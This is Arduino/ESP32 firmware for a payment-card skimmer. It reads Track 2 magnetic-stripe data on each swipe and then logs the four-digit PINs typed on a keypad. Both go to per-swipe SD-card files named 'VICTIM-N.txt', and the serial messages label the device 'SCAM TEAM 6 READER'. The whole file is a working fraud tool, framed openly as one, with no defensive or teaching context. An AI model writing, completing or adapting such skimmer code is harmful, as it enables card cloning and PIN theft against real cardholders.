#include <MagStripe_ESP32.h>
#include <Keypad.h>
#include <SPI.h>
#include <SD.h>

#define HSPI_MISO 12
#define HSPI_MOSI 13
#define HSPI_SCLK 14
#define HSPI_CS 15

// Visual feedback when the card is being read...
static const byte DATA_BUFFER_LEN = 108;
static char data[DATA_BUFFER_LEN];
String newCard;
MagStripe card;
int numSwipes = 0;


//Setting up Keypad...
const byte ROWS = 4;  //four rows
const byte COLS = 4;  //three columns
char keys[ROWS][COLS] = {
  { '1', '2', '3', 'A' },
  { '4', '5', '6', 'B' },
  { '7', '8', '9', 'C' },
  { '*', '0', '#', 'D' }
};
byte rowPins[ROWS] = { 4, 5, 18, 19 };    //connect to the row pinouts of the keypad
byte colPins[COLS] = { 26, 25, 33, 32 };  //connect to the column pinouts of the keypad
Keypad keypad = Keypad(makeKeymap(keys), rowPins, colPins, ROWS, COLS);

//PIN monitoring variables...
String pinData = "";
int keyPress = 0;
uint32_t keyPressTimer;

//File I/O Related Variables...
File currentFile;
String currentFileName;
SPIClass SPI_SD(HSPI);


void SD_Mount() {
  SPI_SD.begin(HSPI_SCLK, HSPI_MISO, HSPI_MOSI);
  if (!SD.begin(HSPI_CS, SPI_SD)) {  //SD_CS_PIN this pin is just the dummy pin since the SD need the input
    Serial.println("[SCAM TEAM 6 READER] SD-CARD FAILED TO MOUNT!");
    return;
  } else Serial.println("\n[SCAM TEAM 6 READER] SD-CARD SUCCESSFULLY MOUNTED!");
}

void SD_Umount() {
  SPI_SD.end();
  SD.end();
}
//This function writes data from Track 2...
void writeCardData() {
  SD_Mount(); //Mount SD CARD
  newCard = String(data);
  Serial.println(newCard);
  currentFileName = "/VICTIM-" + String(numSwipes) + ".txt";
  if (SD.begin(HSPI_CS, SPI_SD))
    Serial.println(currentFileName + " CARD DATA WRITTEN TO SD CARD!");
  currentFile = SD.open(currentFileName, "a");
  currentFile.println("CARD DATA: " + newCard);
  currentFile.close();
  SD_Umount(); //Unmount SD CARD
}

void writePinData() {
  SD_Mount();
  newCard = String(data);
  Serial.println(newCard);
  currentFileName = "/VICTIM-" + String(numSwipes) + ".txt";
  if (SD.begin(HSPI_CS, SPI_SD))
    Serial.println(currentFileName + " PIN DATA WRITTEN TO SD CARD!");
  currentFile = SD.open(currentFileName, "a");
  currentFile.println("PIN DATA: " + pinData);
  currentFile.close();
  SD_Umount();
}

void setup() {  // The card data will be sent over serial...
  Serial.begin(9600);
  card.begin(2);
}


void loop() {

  //After the first swipe, begin recording PIN data...
  if(numSwipes > 0) 
  {
      char key = keypad.getKey();
      if (key) 
      {
        Serial.print(key);
        keyPress++;
        pinData += String(key);
        if (keyPress % 4 == 0) {
          writePinData();
          keyPress = 0;
          pinData = "";
        }
    }
  }
  
  // Don't do anything if there isn't a card present...
  if (!card.available()) {
    return;
  }

  // Read the card into the buffer "data" (as a null-terminated string)...
  short chars = card.read(data, DATA_BUFFER_LEN);

  // If there was an error reading the card, blink the error LED...
  if (chars < 0) {
    delay(250);
    Serial.println("ERROR");
    return;
  } else {
    numSwipes++;
    writeCardData();
   
  }
}
